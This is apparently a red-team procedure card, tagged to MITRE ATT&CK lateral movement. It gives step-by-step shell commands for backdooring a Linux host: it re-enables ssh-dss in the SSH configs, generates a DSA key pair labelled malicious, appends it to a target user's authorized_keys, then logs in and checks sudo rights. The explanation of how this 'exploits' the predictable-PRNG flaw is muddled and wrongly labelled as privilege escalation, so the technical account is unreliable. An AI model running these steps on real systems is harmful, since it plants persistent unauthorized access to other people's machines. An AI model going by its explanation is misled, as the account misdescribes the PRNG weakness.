---
id: d59f6973-770a-4078-8499-6df4438b2f4b
name: Linux-Predictable-PRNG-SSH-Key-Privilege-Escalation
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:18.629320+00:00'
updated_at: '2023-04-10T20:34:29.306798+00:00'
tactics:
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
sub_techniques: []
tags:
  - '[[tags/Linux-Privilege-Escalation]]'
  - '[[tags/SSH-Key]]'
  - '[[tags/SSH-Key-Predictable-PRNG-Authorized-Keys-Process]]'
commands:
  - '[[commands/enable-ssh-dss-support-in-ssh-config-and-restart-service]]'
platforms:
  - Linux
tools: []
validated: true
---

# Linux-Predictable-PRNG-SSH-Key-Privilege-Escalation

## Summary

This procedure exploits vulnerabilities in predictable pseudo-random number generators (PRNG) used for SSH key generation on Linux systems, particularly older DSA (ssh-dss) keys affected by weak entropy sources like the 2008 Debian OpenSSL issue. By enabling support for legacy key types and injecting a malicious public key into the target's ~/.ssh/authorized_keys file, an attacker can achieve remote privileged access via SSH, enabling lateral movement or persistence.

## Description

The technique targets systems where SSH keys are generated with insufficient randomness, allowing attackers to predict or forge keys that match entries in authorized_keys. This is common in legacy setups using DSA keys, which rely on weaker PRNG implementations. The attacker first ensures ssh-dss support is enabled in SSH configurations (as modern defaults disable it for security). Then, using predicted or brute-forced key material, a malicious public key is appended to the victim's authorized_keys. Once connected from the corresponding private key, the attacker gains shell access at the target's privilege level. This is effective in environments with misconfigured permissions on .ssh directories or during privilege escalation chains where initial foothold allows file modification. Prerequisites include local access to modify configs and keys; success leads to remote code execution without passwords.

## Requirements

1. Local access to the target Linux system (e.g., via initial foothold or compromised user account).
2. Write permissions to /etc/ssh/sshd_config and the target's ~/.ssh/authorized_keys file (may require sudo or directory misconfiguration).
3. Root or service restart privileges to apply SSH config changes.
4. A corresponding private SSH key (malicious or predicted) on the attacker's machine.

## Defense

- Use strong, cryptographically secure PRNG for key generation (e.g., avoid legacy DSA keys; prefer Ed25519 or RSA with sufficient entropy).
- Regularly audit and monitor ~/.ssh/authorized_keys files for unauthorized entries using tools like auditd or file integrity monitoring (e.g., AIDE).
- Disable legacy key types (ssh-dss, ssh-rsa) in /etc/ssh/sshd_config via PubkeyAcceptedKeyTypes.
- Implement multi-factor authentication (MFA) for SSH and restrict .ssh directory permissions to 700/600.
- Rotate SSH keys periodically and use certificate-based authentication with short-lived certs.

## Objectives

1. Enable support for vulnerable legacy SSH key types (ssh-dss) to facilitate key injection.
2. Inject a malicious or predicted public SSH key into the target's authorized_keys file.
3. Establish privileged remote access to the target system via SSH using the corresponding private key.
4. Achieve persistence or lateral movement from the gained shell.

## Instructions

### Step 1: Verify Current SSH Configuration

**Context**: Before modifying, check if ssh-dss is already supported or disabled in the SSH configs. This helps determine if changes are needed and avoids unnecessary restarts. Use grep to inspect the files without altering them.

**Command** (custom grep check):
```bash
grep -i PubkeyAcceptedKeyTypes /etc/ssh/ssh_config /etc/ssh/sshd_config || echo "No PubkeyAcceptedKeyTypes directive found"
```

> This command searches for the PubkeyAcceptedKeyTypes directive in both client and server configs. If ssh-dss is not listed or the directive is absent (defaulting to modern keys only), proceed to enable it. Expected output: Lines showing current accepted types or a message indicating absence.

### Step 2: Enable ssh-dss Key Support in SSH Configurations

**Context**: Modern SSH versions disable ssh-dss due to security concerns, but vulnerable systems may require it for predictable key exploitation. Append the directive to allow ssh-dss keys, then restart the service to apply changes. This step is crucial for compatibility with predicted DSA keys.

**Command** ([[commands/enable-ssh-dss-support-in-ssh-config-and-restart-service]]):
```bash
echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/ssh_config
echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/sshd_config
/etc/init.d/ssh restart
```

> This multi-line command appends the necessary line to both client (ssh_config) and server (sshd_config) files to explicitly allow ssh-dss keys, then restarts the SSH service. Run as root. Expected output: No errors from echo (silent append), and restart confirmation like "[ ok ] Restarting ssh (via systemctl): ssh.service." Verify with `ssh -V` showing updated support.

### Step 3: Generate or Predict Malicious SSH Key Pair

**Context**: Exploit the predictable PRNG by generating a DSA key pair using weak entropy (e.g., simulate Debian vulnerability with limited /dev/urandom seeding). In practice, use tools like ssh-keygen with controlled randomness or pre-computed predicted keys from known public keys. This step prepares the public key for injection.

**Command** (ssh-keygen for DSA):
```bash
ssh-keygen -t dsa -b 1024 -f malicious_key -N "" -C "Malicious DSA Key"
```

> Generate a 1024-bit DSA key pair without passphrase. For predictability, run in a controlled low-entropy environment (e.g., limit randomness sources). Expected output: Created files malicious_key (private) and malicious_key.pub (public). The .pub content will be injected next.

### Step 4: Inject Malicious Public Key into Authorized_Keys

**Context**: Append the public key to the target's ~/.ssh/authorized_keys file. This allows authentication with the matching private key. Ensure the .ssh directory exists and has correct permissions (700 for dir, 600 for file); misconfigs often enable this.

**Command** (echo append):
```bash
mkdir -p /home/targetuser/.ssh
echo "ssh-dss AAAAB3NzaC1kc3MAAACBA... malicious_key.pub content here" >> /home/targetuser/.ssh/authorized_keys
chmod 700 /home/targetuser/.ssh
chmod 600 /home/targetuser/.ssh/authorized_keys
```

> Replace the placeholder with actual .pub content from Step 3. This creates the directory if needed, appends the key, and sets secure permissions. Expected output: No errors; verify with `cat /home/targetuser/.ssh/authorized_keys` showing the new key line.

### Step 5: Test Remote Access with Malicious Key

**Context**: From the attacker's machine, attempt SSH login using the private key to validate privilege escalation. This confirms the injection and PRNG exploitation success, providing a shell at the target's privilege level.

**Command** (ssh login):
```bash
ssh -i malicious_key targetuser@target_ip
```

> Use the private key file from Step 3 to connect. Expected output: Successful authentication and a remote shell prompt without password prompt. If predictable PRNG was exploited correctly, the key matches despite weak generation.

### Step 6: Verify and Clean Up (Optional for Testing)

**Context**: Confirm access level (e.g., run id or sudo -l) and remove the key if testing. This step validates escalation and minimizes persistence for red team exercises.

**Command** (verification):
```bash
id
sudo -l
# To remove: sed -i '/malicious_key/d' ~/.ssh/authorized_keys
```

> Run id to check user/group, sudo -l for escalation potential. Expected output: User details showing target privileges; sudo output listing allowed commands.
